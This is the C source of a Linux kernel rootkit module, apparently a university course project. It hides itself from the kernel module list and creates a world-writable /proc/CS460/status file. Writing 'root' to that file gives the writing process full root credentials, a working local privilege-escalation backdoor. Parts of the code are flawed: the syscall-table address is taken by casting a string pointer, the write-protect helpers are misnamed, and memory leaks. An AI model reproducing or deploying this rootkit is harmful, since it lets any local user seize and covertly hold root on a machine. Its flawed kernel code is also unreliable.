#define LINUX

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock_types.h>
#include <linux/slab.h>
#include <linux/cred.h>

#include "rootkit.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("thanomk2,xzhan5");
MODULE_DESCRIPTION("CS460-project");


#define PROCFS_NAME "CS460"

static int get_syscall_table(void);


// proc file pointers
static struct proc_dir_entry *proc_dir;
static struct proc_dir_entry *proc_dir_entry;

// Create new lock
static spinlock_t lock;

// flags
static int is_rootkit_hidden = 0;

// Syscall table pointers
static void **syscall_table_pointer;

// Module argument
static char* sys_call_table_addr_input = NULL;
module_param(sys_call_table_addr_input, charp, 0);

// Help strings
static char *help = "Recognized commands: hide, unhide, root";

// Create new process_info struct
typedef struct process_info{

  struct list_head list;

}process_info;

// for /proc file 
struct file_operations procFile_fops = {

    .owner = THIS_MODULE,
    .read = rootkit_read,
    .write = rootkit_write,

};


// for restoring this module later
struct list_head *module_list;


/* This two functions deal with the writable bit in cpu that prevent the syscall_table \
	tampering
*/
static void enable_write_protect(void){

		// we need to stop kernel to preemp these functions
		preempt_disable();

		barrier();

		// writable protect = 16th bit
        write_cr0(read_cr0() & (~ 0x10000));
}


static void disable_write_protect(void){

		preempt_enable();

		barrier();

        write_cr0(read_cr0() | 0x10000);
}


/* Idea from

	1) https://memset.wordpress.com/2011/01/20/ \
	syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/

	2) https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/

	This function will return the address of syscall_table from the given \
	System.map-$(uname -r). In this version, we assume that the attacker will
	execute that install shellscript. 

	Note: We still have to disable the write-protection bit as well.

*/
static int get_syscall_table(void){

    if(!sys_call_table_addr_input){

        return -1;

    }
	
	syscall_table_pointer = (void**)sys_call_table_addr_input;

    #ifdef VERBOSE

	pr_info("Disabling write-protection...");

    #endif

	enable_write_protect();


	disable_write_protect();

    #ifdef VERBOSE

	pr_info("Enabling write-protection...");

    #endif

	return 0;	
	
}

// We hide the module by removing in from the list
static int hide_self(void){

	if(!is_rootkit_hidden){

		// Store previous module list_head to restore later
		module_list = THIS_MODULE->list.prev;
		
		list_del(&THIS_MODULE->list);

		is_rootkit_hidden = 1;

        #ifdef VERBOSE

		pr_info("Hide successfull.");

        #endif
	}

	return 0;
}

// to unhide, we restore the module back to list
static int unhide_self(void){

	if(is_rootkit_hidden){

		list_add(&THIS_MODULE->list, module_list);

		is_rootkit_hidden = 0;

        #ifdef VERBOSE

		pr_info("Unhide successfull.");

        #endif

	}

	return 0;
}

// for granting root, we tampering the cred structure of current task to root
static int get_root(void){

	struct cred *task_credential;

	// altering the credential		
	task_credential = prepare_creds();

	if(!task_credential){

		return -ENOMEM;
	}

    // Set credential to root
	task_credential->uid.val = 0; 
	task_credential->suid.val = 0;
	task_credential->euid.val = 0;

    task_credential->gid.val = 0;
    task_credential->sgid.val = 0;
    task_credential->egid.val = 0;
    
    commit_creds(task_credential);

	return 0;
}

// parse incoming input
static int parse_input(char *commands){

	if( strcmp(commands, "hide") == 0 ){

		hide_self();
	}
	else if( strcmp(commands, "unhide") == 0 ){
		
		unhide_self();
	}
	else if ( strcmp(commands, "root") == 0 ){

		get_root();
		
	}
    else{
        return -1;
    }

	return 0;

}

// write output to /proc
static ssize_t rootkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data){

    int copied;
    unsigned long tmpFlags;
    char *buf = kmalloc(sizeof(char)*1024, GFP_KERNEL);

    // For EOF
    static int done = 0;

    if(done){
      done = 0;
      return 0;
    }

    
    done = 1;
    copied = 0;

    // perform the buffer transfer
    spin_lock_irqsave(&lock, tmpFlags);

    // Send help to user 
    copied = sprintf(buf,"%s\n", help);

    spin_unlock_irqrestore(&lock, tmpFlags);

    if(copy_to_user(buffer, buf, copied)){
        return -EFAULT;
    }

    kfree(buf);

    buf = NULL;

    return copied;
}


// Read input from /proc
static ssize_t rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *data){

    char *buf;

    buf = (char *) kzalloc(count, GFP_KERNEL);

    if(copy_from_user(buf, buffer, count)){

        #ifdef VERBOSE

        pr_info("Error reading from /proc");

        #endif

        return -EFAULT;
    }

    buf[strlen(buf) - 1] = '\0';

    parse_input(buf);

    kfree(buf);

    buf = NULL;

    return count;
}


int __init rootkit_init(void)
{
	is_rootkit_hidden = 0;

    // First create new directory under /proc
    proc_dir = proc_mkdir(PROCFS_NAME, NULL);

    if(proc_dir == NULL){

        #ifdef VERBOSE

        pr_alert("Could not create /proc/%s\n", PROCFS_NAME);

        #endif


        return -ENOMEM;
    }

    // create the status file       
    proc_dir_entry = proc_create("status", 0666 , proc_dir, &procFile_fops);

    if(proc_dir_entry == NULL){

       proc_remove(proc_dir);

       #ifdef VERBOSE

       pr_alert("Could not create /proc/%s/status\n", PROCFS_NAME);

       #endif

       return -ENOMEM;
    }

    // initialize spin_lock
    spin_lock_init(&lock);

	get_syscall_table();

	hide_self();

    #ifdef VERBOSE

    pr_alert("MODULE LOADED\n");

    #endif

    return 0;   
}

void __exit rootkit_exit(void)
{


    proc_remove(proc_dir_entry);

    proc_remove(proc_dir);

    unhide_self();
   
    #ifdef VERBOSE

    pr_alert("MODULE UNLOADED\n");

    #endif
}

// Register init and exit funtions
module_init(rootkit_init);
module_exit(rootkit_exit);
